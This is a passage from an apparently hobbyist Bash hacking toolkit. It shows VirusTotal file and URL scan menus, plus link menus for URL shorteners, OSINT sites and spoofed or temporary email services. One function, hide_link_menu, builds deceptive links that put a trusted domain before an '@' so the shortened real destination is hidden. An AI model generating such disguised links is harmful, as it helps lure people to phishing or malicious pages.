    echo -e "${greenbold}[${reset}*${greenbold}] ESET-NOD32 --> ${reset}${ESETNOD32_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] ESET-NOD32 Result --> ${reset}${ESETNOD32_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] F-Secure --> ${reset}${FSECURE_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] F-Secure Result --> ${reset}${FSECURE_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] FORTINET --> ${reset}${FORTINET_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] FORTINET Result --> ${reset}${FORTINET_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] GDATA --> ${reset}${GDATA_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] GDATA Result --> ${reset}${GDATA_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] GRIDINSOFT --> ${reset}${GRIDINSOFT_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] GRIDINSOFT Result --> ${reset}${GRIDINSOFT_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] IKARUS --> ${reset}${IKARUS_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] IKARUS Result --> ${reset}${IKARUS_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] JIANGMIN --> ${reset}${JIANGMIN_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] JIANGMIN Result --> ${reset}${JIANGMIN_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] K7AntiVirus --> ${reset}${K7AV_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] K7AntiVirus Result --> ${reset}${K7AV_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] K7GW --> ${reset}${K7GW_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] K7GW Result --> ${reset}${K7GW_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] KASPERSKY --> ${reset}${KASPERSKY_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] KASPERSKY Result --> ${reset}${KASPERSKY_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] KINGSOFT --> ${reset}${KINGSOFT_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] KINGSOFT Result --> ${reset}${KINGSOFT_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Lionic --> ${reset}${LIONIC_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Lionic Result --> ${reset}${LIONIC_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Malwarebytes --> ${reset}${MALWAREBYTES_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Malwarebytes Result --> ${reset}${MALWAREBYTES_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] MAX --> ${reset}${MAX_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] MAX Result --> ${reset}${MAX_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Max Secure --> ${reset}${MAXSEC_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Max Secure Result --> ${reset}${MAXSEC_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Mc Afee --> ${reset}${MCAFEE_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Mc Afee Result --> ${reset}${MCAFEE_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] McAfee GW Edition --> ${reset}${MCAFEEGW_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] McAfee GW Edition Result --> ${reset}${MCAFEEGW_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Microsoft --> ${reset}${MICROSOFT_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Microsoft Result --> ${reset}${MICROSOFT_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] NANO Antivirus --> ${reset}${NANOAV_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] NANO Antivirus Result --> ${reset}${NANOAV_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Panda --> ${reset}${PANDA_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Panda Result --> ${reset}${PANDA_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Paloalto --> ${reset}${PALOALTO_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Paloalto Result --> ${reset}${PALOALTO_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Rising --> ${reset}${RISING_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Rising Result --> ${reset}${RISING_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Sangfor --> ${reset}${SANGFOR_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Sangfor Result --> ${reset}${SANGFOR_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Sophos --> ${reset}${SOPHOS_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Sophos Result --> ${reset}${SOPHOS_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] SUPER Anti Spyware --> ${reset}${SAS_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] SUPER Anti Spyware Result --> ${reset}${SAS_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Symantec --> ${reset}${SYMANTEC_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Symantec Result --> ${reset}${SYMANTEC_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Symantec Mobile --> ${reset}${SYMANTECMOBILE_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Symantec Mobile Result --> ${reset}${SYMANTECMOBILE_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Secure Age APEX --> ${reset}${SAAPEX_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Secure Age APEX Result --> ${reset}${SAAPEX_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Sentinel One --> ${reset}${SENTINELONE_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Sentinel One Result --> ${reset}${SENTINELONE_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] TACHYON --> ${reset}${TACHYON_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] TACHYON Result --> ${reset}${TACHYON_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Tencent --> ${reset}${TENCENT_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Tencent Result --> ${reset}${TENCENT_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Fire Eye --> ${reset}${FIREEYE_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Fire Eye Result --> ${reset}${FIREEYE_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Trend Micro --> ${reset}${TRENDMICRO_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Trend Micro Result --> ${reset}${TRENDMICRO_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Trend Micro HouseCall --> ${reset}${TRENDMICROHC_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Trend Micro HouseCall Result --> ${reset}${TRENDMICROHC_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Tehtris --> ${reset}${TEHTRIS_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Tehtris Result --> ${reset}${TEHTRIS_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Trapmine --> ${reset}${TRAPMINE_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Trapmine Result --> ${reset}${TRAPMINE_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Trustlook --> ${reset}${TRUSTLOOK_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Trustlook Result --> ${reset}${TRUSTLOOK_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] VBA32 --> ${reset}${VBA32_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] VBA32 Result --> ${reset}${VBA32_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] VIRIT --> ${reset}${VIRIT_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] VIRIT Result --> ${reset}${VIRIT_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Vi Robot --> ${reset}${VIROBOT_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Vi Robot Result --> ${reset}${VIROBOT_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Webroot --> ${reset}${WEBROOT_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Webroot Result --> ${reset}${WEBROOT_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Yandex --> ${reset}${YANDEX_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Yandex Result --> ${reset}${YANDEX_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Zillya --> ${reset}${ZILLYA_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Zillya Result --> ${reset}${ZILLYA_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Zone Alarm --> ${reset}${ZONEALARM_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Zone Alarm Result --> ${reset}${ZONEALARM_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Zoner --> ${reset}${ZONER_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Zoner Result --> ${reset}${ZONER_Result}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] MENU${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' virus_scan_file_result_view
    if [[ ${virus_scan_file_result_view} == "01" ]] || [[ ${virus_scan_file_result_view} == "1" ]];then
    rm -rf ${script_dir}/.files/FILERESULTS.json
    main_menu
    elif [[ ${virus_scan_file_result_view} == "00" ]] || [[ ${virus_scan_file_result_view} == "0" ]];then
    virus_scan_file_result
    fi
}

virus_scan_url(){
    clear
    banner
    echo -e "${bluebold}[* VIRUS SCAN URL *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter URL.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' virus_scan_url

    clear
    banner
    echo -e "${bluebold}[* VIRUS SCAN URL *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Uploading URL...${reset} ${virus_scan_url}"
    UPLOAD_VT=$(curl -s --request POST --url https://www.virustotal.com/api/v3/urls --form url=${virus_scan_url} --header "x-apikey: ${API_KEY_VT}" | jq .data.id | cut -d- -f2)
    sleep 1

    clear
    banner
    echo -e "${bluebold}[* VIRUS SCAN URL *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Analyzing URL... 60 Seconds.${reset}"
    ANALYZE_VT=$(curl -s --request POST --url https://www.virustotal.com/api/v3/urls/${UPLOAD_VT}/analyse --header "x-apikey: ${API_KEY_VT}")
    sleep 60

    clear
    banner
    echo -e "${bluebold}[* VIRUS SCAN URL *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] URL Analyzed.${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Searching Results... 5 Seconds.${reset}"
    sleep 5

    cd ${script_dir}/.files || exit_script
    RESULTS_VT=$(curl -s --request GET --url https://www.virustotal.com/api/v3/urls/${UPLOAD_VT} --header "x-apikey: ${API_KEY_VT}" > URLRESULTS.json)
    
    LINK=$(jq '.[] | .id' URLRESULTS.json | xargs)

    COUNTRESULTUND=$(jq '.[] | .attributes.last_analysis_stats.undetected' URLRESULTS.json | xargs)
    COUNTRESULTDET=$(jq '.[] | .attributes.last_analysis_stats.malicious' URLRESULTS.json | xargs)
    COUNTRESULTHAR=$(jq '.[] | .attributes.last_analysis_stats.harmless' URLRESULTS.json | xargs)
    COUNTRESULTSUS=$(jq '.[] | .attributes.last_analysis_stats.suspicious' URLRESULTS.json | xargs)

    TITLE=$(jq '.[] | .attributes.title' URLRESULTS.json | xargs)
    DESC=$(jq '.[] | .attributes."html_meta".description' URLRESULTS.json | xargs)

    if [[ ${COUNTRESULTUND} -gt "10" ]];then
    GENRE="NO VIRUS DETECTED"
    fi
    
    if [[ ${COUNTRESULTHAR} -gt "10" ]];then
    GENRE="NO VIRUS DETECTED"
    fi

    if [[ ${COUNTRESULTDET} -gt "5" ]];then
    GENRE="VIRUS DETECTED"
    fi

    virus_scan_url_result
}

virus_scan_url_result(){
    clear
    banner
    echo -e "${bluebold}[* VIRUS SCAN URL *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] RESULTS"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] General Result --> ${reset}${GENRE}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] AV No Detected --> ${reset}${COUNTRESULTUND}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] AV Detected --> ${reset}${COUNTRESULTDET}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] AV Harmless --> ${reset}${COUNTRESULTHAR}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] AV Suspicious --> ${reset}${COUNTRESULTSUS}${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Title --> ${reset}${TITLE}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Description --> ${reset}${DESC}${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Link --> ${reset}https://www.virustotal.com/gui/url/${LINK}${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] MENU${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' virus_scan_url_result
    if [[ ${virus_scan_url_result} == "01" ]] || [[ ${virus_scan_url_result} == "1" ]];then
    rm -rf ${script_dir}/.files/URLRESULTS.json
    main_menu
    elif [[ ${virus_scan_url_result} == "00" ]] || [[ ${virus_scan_url_result} == "0" ]];then
    rm -rf ${script_dir}/.files/URLRESULTS.json
    main_menu
    fi
}

hide_link_menu(){
    clear
    banner
    echo -e "${bluebold}[* SELECT OPTION *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter URL to hide.${reset} (with https:// or http://)"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' hide_link_menu_url
    if [[ -z ${hide_link_menu_url} ]];then
    error_404
    sleep 1
    hide_link_menu
    fi

    clear
    banner
    echo -e "${bluebold}[* SELECT OPTION *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter URL to convert.${reset} (Ex: https://www.facebook.com)"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' hide_link_menu_template_url
    if [[ -z ${hide_link_menu_template_url} ]];then
    error_404
    sleep 1
    hide_link_menu
    fi

    clear
    banner
    echo -e "${bluebold}[* SELECT OPTION *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter complement for converted url separated with '-'${reset} (Ex: bears-pictures)"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' hide_link_menu_complement

    hide_link_menu_mod_complement=$(echo "${hide_link_menu_complement}" | sed 's/-/%7A/g')
    hide_link_menu_link=$(curl -s --data "url=${hide_link_menu_url}&shorturl=&opt=0" https://is.gd/create.php | html2text | grep "https" | head -n 1 | sed 's/\[//' | sed 's/\]//' | sed 's/https:\/\///')

    if [[ -z ${hide_link_menu_complement} ]];then
    hide_link_menu_result="${hide_link_menu_template_url}@${hide_link_menu_link}"
    echo -e "${hide_link_menu_result}" | xclip -sel clip
    clear
    banner
    echo -e "${bluebold}[* SELECT OPTION *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Hidden URL:${reset} ${hide_link_menu_result}"
    echo -e "${greenbold}[${reset}*${greenbold}] URL Copied to clipboard."
    else
	hide_link_menu_result="${hide_link_menu_template_url}%7A${hide_link_menu_mod_complement}@${hide_link_menu_link}"
    echo ${hide_link_menu_result} | xclip -sel clip
    clear
    banner
    echo -e "${bluebold}[* SELECT OPTION *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Hidden URL:${reset} ${hide_link_menu_result}"
    echo -e "${greenbold}[${reset}*${greenbold}] URL Copied to clipboard."
    fi
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] MENU${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] EXIT${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' hide_link_menu
    if [[ ${hide_link_menu} == "01" ]] || [[ ${hide_link_menu} == "1" ]];then
    main_menu
    elif [[ ${hide_link_menu} == "00" ]] || [[ ${hide_link_menu} == "0" ]];then
    exit_script
    fi
}

pages_menu(){
    clear
    banner
    echo -e "${bluebold}[* SELECT OPTION *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] URL Shorteners"${reset}
    echo -e "${bluebold}[${reset}02${bluebold}] Osint${reset}"
    echo -e "${bluebold}[${reset}03${bluebold}] Fake Emails${reset}"
    echo -e "${bluebold}[${reset}04${bluebold}] Hacking Learning${reset}"
    echo -e "${bluebold}[${reset}05${bluebold}] Data Bases${reset}"
    echo -e "${bluebold}[${reset}06${bluebold}] Check Pwned${reset}"
    echo -e "${bluebold}[${reset}07${bluebold}] Dark Sites${reset}"
    echo -e "${bluebold}[${reset}08${bluebold}] Movies${reset}"
    echo -e "${bluebold}[${reset}09${bluebold}] Youtube Hacking${reset}"
    echo -e "${bluebold}[${reset}10${bluebold}] Torrents & Files${reset}"
    echo -e "${bluebold}[${reset}99${bluebold}] Contact Z3R0${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' pages_menu

    if [[ ${pages_menu} == "01" ]] || [[ ${pages_menu} == "1" ]];then
    pages_url_shorteners
    elif [[ ${pages_menu} == "02" ]] || [[ ${pages_menu} == "2" ]];then
    pages_osint
    elif [[ ${pages_menu} == "03" ]] || [[ ${pages_menu} == "3" ]];then
    pages_fake_emails
    elif [[ ${pages_menu} == "04" ]] || [[ ${pages_menu} == "4" ]];then
    pages_hacking_learning
    elif [[ ${pages_menu} == "05" ]] || [[ ${pages_menu} == "5" ]];then
    pages_data_bases
    elif [[ ${pages_menu} == "06" ]] || [[ ${pages_menu} == "6" ]];then
    pages_check_pwned
    elif [[ ${pages_menu} == "07" ]] || [[ ${pages_menu} == "7" ]];then
    pages_darks_sites
    elif [[ ${pages_menu} == "08" ]] || [[ ${pages_menu} == "8" ]];then
    pages_movies
    elif [[ ${pages_menu} == "09" ]] || [[ ${pages_menu} == "9" ]];then
    pages_yt_hacking
    elif [[ ${pages_menu} == "10" ]] || [[ ${pages_menu} == "10" ]];then
    pages_torrents_files
    elif [[ ${pages_menu} == "99" ]] || [[ ${pages_menu} == "99" ]];then
    pages_contact
    elif [[ ${pages_menu} == "00" ]] || [[ ${pages_menu} == "0" ]];then
    main_menu
    else
    clear
    banner
    error_404
    sleep 1
    pages_menu
    fi
}

pages_url_shorteners(){
    clear
    banner
    echo -e "${bluebold}[* SELECT SHORTENER *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] Cutt.ly${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] Shorturl.at${reset}"
    echo -e "${bluebold}[${reset}03${bluebold}] Shorturl.com${reset}"
    echo -e "${bluebold}[${reset}04${bluebold}] N9.cl${reset}"
    echo -e "${bluebold}[${reset}05${bluebold}] Xurl.es${reset}"
    echo -e "${bluebold}[${reset}06${bluebold}] Tinyurl.com${reset}"
    echo -e "${bluebold}[${reset}07${bluebold}] Chilp.it${reset}"
    echo -e "${bluebold}[${reset}08${bluebold}] Clck.ru${reset}"
    echo -e "${bluebold}[${reset}09${bluebold}] Da.gd${reset}"
    echo -e "${bluebold}[${reset}10${bluebold}] Is.gd${reset}"
    echo -e "${bluebold}[${reset}11${bluebold}] Grabify.link${reset}"
    echo -e "${bluebold}[${reset}12${bluebold}] Bitly.com${reset}"
    echo -e "${bluebold}[${reset}13${bluebold}] Rebrandly.com${reset}"
    echo -e "${bluebold}[${reset}14${bluebold}] Shortener.rb.gy${reset}"
    echo -e "${bluebold}[${reset}15${bluebold}] Shadyurl.com${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' pages_url_shorteners

    if [[ ${pages_url_shorteners} == "01" ]] || [[ ${pages_url_shorteners} == "1" ]];then
    xdg-open https://cutt.ly > /dev/null 2>&1
    pages_url_shorteners
    elif [[ ${pages_url_shorteners} == "02" ]] || [[ ${pages_url_shorteners} == "2" ]];then
    xdg-open https://www.shorturl.at > /dev/null 2>&1
    pages_url_shorteners
    elif [[ ${pages_url_shorteners} == "03" ]] || [[ ${pages_url_shorteners} == "3" ]];then
    xdg-open https://www.shorturl.com > /dev/null 2>&1
    pages_url_shorteners
    elif [[ ${pages_url_shorteners} == "04" ]] || [[ ${pages_url_shorteners} == "4" ]];then
    xdg-open https://n9.cl/es > /dev/null 2>&1
    pages_url_shorteners
    elif [[ ${pages_url_shorteners} == "05" ]] || [[ ${pages_url_shorteners} == "5" ]];then
    xdg-open https://xurl.es > /dev/null 2>&1
    pages_url_shorteners
    elif [[ ${pages_url_shorteners} == "06" ]] || [[ ${pages_url_shorteners} == "6" ]];then
    xdg-open https://tinyurl.com/app > /dev/null 2>&1
    pages_url_shorteners
    elif [[ ${pages_url_shorteners} == "07" ]] || [[ ${pages_url_shorteners} == "7" ]];then
    xdg-open http://chilp.it > /dev/null 2>&1
    pages_url_shorteners
    elif [[ ${pages_url_shorteners} == "08" ]] || [[ ${pages_url_shorteners} == "8" ]];then
    xdg-open https://clck.ru > /dev/null 2>&1
    pages_url_shorteners
    elif [[ ${pages_url_shorteners} == "09" ]] || [[ ${pages_url_shorteners} == "9" ]];then
    xdg-open https://da.gd > /dev/null 2>&1
    pages_url_shorteners
    elif [[ ${pages_url_shorteners} == "10" ]] || [[ ${pages_url_shorteners} == "10" ]];then
    xdg-open https://is.gd > /dev/null 2>&1
    pages_url_shorteners
    elif [[ ${pages_url_shorteners} == "11" ]] || [[ ${pages_url_shorteners} == "11" ]];then
    xdg-open https://grabify.link > /dev/null 2>&1
    pages_url_shorteners
    elif [[ ${pages_url_shorteners} == "12" ]] || [[ ${pages_url_shorteners} == "12" ]];then
    xdg-open https://bitly.com > /dev/null 2>&1
    pages_url_shorteners
    elif [[ ${pages_url_shorteners} == "13" ]] || [[ ${pages_url_shorteners} == "13" ]];then
    xdg-open https://www.rebrandly.com > /dev/null 2>&1
    pages_url_shorteners
    elif [[ ${pages_url_shorteners} == "14" ]] || [[ ${pages_url_shorteners} == "14" ]];then
    xdg-open https://free-url-shortener.rb.gy > /dev/null 2>&1
    pages_url_shorteners
    elif [[ ${pages_url_shorteners} == "15" ]] || [[ ${pages_url_shorteners} == "15" ]];then
    xdg-open http://www.shadyurl.com > /dev/null 2>&1
    pages_url_shorteners
    elif [[ ${pages_url_shorteners} == "00" ]] || [[ ${pages_url_shorteners} == "0" ]];then
    pages_menu
    else
    clear
    banner
    error_404
    sleep 1
    pages_url_shorteners
    fi
}

pages_osint(){
    clear
    banner
    echo -e "${bluebold}[* SELECT OSINT *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] Osinttechniques.com"${reset}
    echo -e "${bluebold}[${reset}02${bluebold}] Osintframework.com${reset}"
    echo -e "${bluebold}[${reset}03${bluebold}] Osint.tools${reset}"
    echo -e "${bluebold}[${reset}04${bluebold}] Osint.link${reset}"
    echo -e "${bluebold}[${reset}05${bluebold}] Ciberpatrulla.com${reset}"
    echo -e "${bluebold}[${reset}06${bluebold}] Start.me${reset}"
    echo -e "${bluebold}[${reset}07${bluebold}] BlogOsintTools.com${reset}"
    echo -e "${bluebold}[${reset}08${bluebold}] Shodan.io${reset}"
    echo -e "${bluebold}[${reset}09${bluebold}] Crt.sh${reset}"
    echo -e "${bluebold}[${reset}10${bluebold}] Archive.org${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' pages_osint

    if [[ ${pages_osint} == "01" ]] || [[ ${pages_osint} == "1" ]];then
    xdg-open https://www.osinttechniques.com > /dev/null 2>&1
    pages_osint
    elif [[ ${pages_osint} == "02" ]] || [[ ${pages_osint} == "2" ]];then
    xdg-open https://osintframework.com > /dev/null 2>&1
    pages_osint
    elif [[ ${pages_osint} == "03" ]] || [[ ${pages_osint} == "3" ]];then
    xdg-open https://osint.tools > /dev/null 2>&1
    pages_osint
    elif [[ ${pages_osint} == "04" ]] || [[ ${pages_osint} == "4" ]];then
    xdg-open https://osint.link > /dev/null 2>&1
    pages_osint
    elif [[ ${pages_osint} == "05" ]] || [[ ${pages_osint} == "5" ]];then
    xdg-open https://ciberpatrulla.com/links/ > /dev/null 2>&1
    pages_osint
    elif [[ ${pages_osint} == "06" ]] || [[ ${pages_osint} == "6" ]];then
    xdg-open https://start.me/p/ZME8nR/osint > /dev/null 2>&1
    pages_osint
    elif [[ ${pages_osint} == "07" ]] || [[ ${pages_osint} == "7" ]];then
    xdg-open https://blog.segu-info.com.ar/2020/10/listado-de-herramientas-osint.html?m=0 > /dev/null 2>&1
    pages_osint
    elif [[ ${pages_osint} == "08" ]] || [[ ${pages_osint} == "8" ]];then
    xdg-open https://www.shodan.io > /dev/null 2>&1
    pages_osint
    elif [[ ${pages_osint} == "09" ]] || [[ ${pages_osint} == "9" ]];then
    xdg-open https://crt.sh > /dev/null 2>&1
    pages_osint
    elif [[ ${pages_osint} == "10" ]] || [[ ${pages_osint} == "10" ]];then
    xdg-open https://archive.org > /dev/null 2>&1
    pages_osint
    elif [[ ${pages_osint} == "00" ]] || [[ ${pages_osint} == "0" ]];then
    pages_menu
    else
    clear
    banner
    error_404
    sleep 1
    pages_osint
    fi
}

pages_fake_emails(){
    clear
    banner
    echo -e "${bluebold}[* SELECT FAKE MAIL *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] TempMail.org"${reset}
    echo -e "${bluebold}[${reset}02${bluebold}] Emkei.cz${reset}"
    echo -e "${bluebold}[${reset}03${bluebold}] Anonymouse.org${reset}"
    echo -e "${bluebold}[${reset}04${bluebold}] TempMail.io${reset}"
    echo -e "${bluebold}[${reset}05${bluebold}] Tempail.com${reset}"
    echo -e "${bluebold}[${reset}06${bluebold}] Mail.tm${reset}"
    echo -e "${bluebold}[${reset}07${bluebold}] EmailFake.com${reset}"
    echo -e "${bluebold}[${reset}08${bluebold}] GuerrillaMail.com${reset}"
    echo -e "${bluebold}[${reset}09${bluebold}] SendEmail.org${reset}"
    echo -e "${bluebold}[${reset}10${bluebold}] Gilc.org${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' pages_fake_emails

    if [[ ${pages_fake_emails} == "01" ]] || [[ ${pages_fake_emails} == "1" ]];then
    xdg-open https://temp-mail.org > /dev/null 2>&1
    pages_fake_emails
    elif [[ ${pages_fake_emails} == "02" ]] || [[ ${pages_fake_emails} == "2" ]];then
    xdg-open https://emkei.cz/ > /dev/null 2>&1
    pages_fake_emails
    elif [[ ${pages_fake_emails} == "03" ]] || [[ ${pages_fake_emails} == "3" ]];then
    xdg-open http://anonymouse.org/anonemail.html > /dev/null 2>&1
    pages_fake_emails
    elif [[ ${pages_fake_emails} == "04" ]] || [[ ${pages_fake_emails} == "4" ]];then
    xdg-open https://temp-mail.io > /dev/null 2>&1
    pages_fake_emails
    elif [[ ${pages_fake_emails} == "05" ]] || [[ ${pages_fake_emails} == "5" ]];then
    xdg-open https://tempail.com > /dev/null 2>&1
    pages_fake_emails
    elif [[ ${pages_fake_emails} == "06" ]] || [[ ${pages_fake_emails} == "6" ]];then
    xdg-open https://mail.tm > /dev/null 2>&1
    pages_fake_emails
    elif [[ ${pages_fake_emails} == "07" ]] || [[ ${pages_fake_emails} == "7" ]];then
    xdg-open https://email-fake.com > /dev/null 2>&1
    pages_fake_emails
    elif [[ ${pages_fake_emails} == "08" ]] || [[ ${pages_fake_emails} == "8" ]];then
    xdg-open https://www.guerrillamail.com > /dev/null 2>&1
    pages_fake_emails
    elif [[ ${pages_fake_emails} == "09" ]] || [[ ${pages_fake_emails} == "9" ]];then
    xdg-open https://send-email.org > /dev/null 2>&1
    pages_fake_emails
    elif [[ ${pages_fake_emails} == "10" ]] || [[ ${pages_fake_emails} == "10" ]];then
    xdg-open http://gilc.org/speech/anonymous/remailer.html > /dev/null 2>&1
    pages_fake_emails
